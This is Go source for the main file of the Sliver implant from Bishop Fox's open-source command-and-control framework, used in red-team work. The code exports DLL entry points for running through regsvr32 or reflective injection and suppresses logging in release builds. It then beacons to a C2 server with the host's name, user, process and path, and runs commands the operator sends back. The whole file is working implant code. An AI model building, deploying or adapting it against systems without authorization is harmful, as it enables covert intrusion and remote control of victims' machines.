package main

/*
	Sliver Implant Framework
	Copyright (C) 2019  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

// {{if .IsSharedLib}}
//#include "sliver.h"
import "C"

// {{end}}

import (
	"os"
	"os/user"
	"runtime"
	"time"

	// {{if .Debug}}{{else}}
	"io/ioutil"
	// {{end}}

	"log"

	pb "github.com/bishopfox/sliver/protobuf/sliverpb"
	consts "github.com/bishopfox/sliver/sliver/constants"
	"github.com/bishopfox/sliver/sliver/handlers"
	"github.com/bishopfox/sliver/sliver/limits"
	"github.com/bishopfox/sliver/sliver/transports"
	"github.com/bishopfox/sliver/sliver/version"

	"github.com/golang/protobuf/proto"
)

// {{if .IsSharedLib}}

var isRunning bool = false

// RunSliver - Export for shared lib build
//export RunSliver
func RunSliver() {
	if !isRunning {
		isRunning = true
		main()
	}
}

// Thanks Ne0nd0g for those
//https://github.com/Ne0nd0g/merlin/blob/master/cmd/merlinagentdll/main.go#L65

// VoidFunc is an exported function used with PowerSploit's Invoke-ReflectivePEInjection.ps1
//export VoidFunc
func VoidFunc() { main() }

// DllInstall is used when executing the Sliver implant with regsvr32.exe (i.e. regsvr32.exe /s /n /i sliver.dll)
// https://msdn.microsoft.com/en-us/library/windows/desktop/bb759846(v=vs.85).aspx
//export DllInstall
func DllInstall() { main() }

// DLLRegisterServer is used when executing the Sliver implant with regsvr32.exe (i.e. regsvr32.exe /s sliver.dll)
// https://msdn.microsoft.com/en-us/library/windows/desktop/ms682162(v=vs.85).aspx
//export DllRegisterServer
func DllRegisterServer() { main() }

// DLLUnregisterServer is used when executing the Sliver implant with regsvr32.exe (i.e. regsvr32.exe /s /u sliver.dll)
// https://msdn.microsoft.com/en-us/library/windows/desktop/ms691457(v=vs.85).aspx
//export DllUnregisterServer
func DllUnregisterServer() { main() }

// {{end}}

func main() {

	// {{if .Debug}}
	log.SetFlags(log.LstdFlags | log.Lshortfile)
	// {{else}}
	log.SetFlags(0)
	log.SetOutput(ioutil.Discard)
	// {{end}}

	// {{if .Debug}}
	log.Printf("Hello my name is %s", consts.SliverName)
	// {{end}}

	limits.ExecLimits() // Check to see if we should execute

	for {
		connection := transports.StartConnectionLoop()
		if connection == nil {
			break
		}
		mainLoop(connection)
		// {{if .Debug}}
		log.Printf("Lost connection, sleeping ...")
		// {{end}}
		time.Sleep(60 * time.Second) // TODO: Make configurable
	}
}

func mainLoop(connection *transports.Connection) {

	connection.Send <- getRegisterSliver() // Send registration information

	tunHandlers := handlers.GetTunnelHandlers()
	sysHandlers := handlers.GetSystemHandlers()
	specialHandlers := handlers.GetSpecialHandlers()

	for envelope := range connection.Recv {
		if handler, ok := specialHandlers[envelope.Type]; ok {
			// {{if .Debug}}
			log.Printf("[recv] specialHandler %d", envelope.Type)
			// {{end}}
			handler(envelope.Data, connection)
		} else if handler, ok := sysHandlers[envelope.Type]; ok {
			// {{if .Debug}}
			log.Printf("[recv] sysHandler %d", envelope.Type)
			// {{end}}
			go handler(envelope.Data, func(data []byte, err error) {
				connection.Send <- &pb.Envelope{
					ID:   envelope.ID,
					Data: data,
				}
			})
		} else if handler, ok := tunHandlers[envelope.Type]; ok {
			// {{if .Debug}}
			log.Printf("[recv] tunHandler %d", envelope.Type)
			// {{end}}
			go handler(envelope, connection)
		} else {
			// {{if .Debug}}
			log.Printf("[recv] unknown envelope type %d", envelope.Type)
			// {{end}}
		}
	}
}

func getRegisterSliver() *pb.Envelope {
	hostname, err := os.Hostname()
	if err != nil {
		// {{if .Debug}}
		log.Printf("Failed to determine hostname %s", err)
		// {{end}}
		hostname = ""
	}
	currentUser, err := user.Current()
	if err != nil {

		// {{if .Debug}}
		log.Printf("Failed to determine current user %s", err)
		// {{end}}

		// Gracefully error out
		currentUser = &user.User{
			Username: "<< error >>",
			Uid:      "<< error >>",
			Gid:      "<< error >>",
		}

	}
	filename, err := os.Executable()
	// Should not happen, but still...
	if err != nil {
		//TODO: build the absolute path to os.Args[0]
		if 0 < len(os.Args) {
			filename = os.Args[0]
		} else {
			filename = "<< error >>"
		}
	}
	data, err := proto.Marshal(&pb.Register{
		Name:     consts.SliverName,
		Hostname: hostname,
		Username: currentUser.Username,
		Uid:      currentUser.Uid,
		Gid:      currentUser.Gid,
		Os:       runtime.GOOS,
		Version:  version.GetVersion(),
		Arch:     runtime.GOARCH,
		Pid:      int32(os.Getpid()),
		Filename: filename,
		ActiveC2: transports.GetActiveC2(),
	})
	if err != nil {
		// {{if .Debug}}
		log.Printf("Failed to encode Register msg %s", err)
		// {{end}}
		return nil
	}
	return &pb.Envelope{
		Type: pb.MsgRegister,
		Data: data,
	}
}
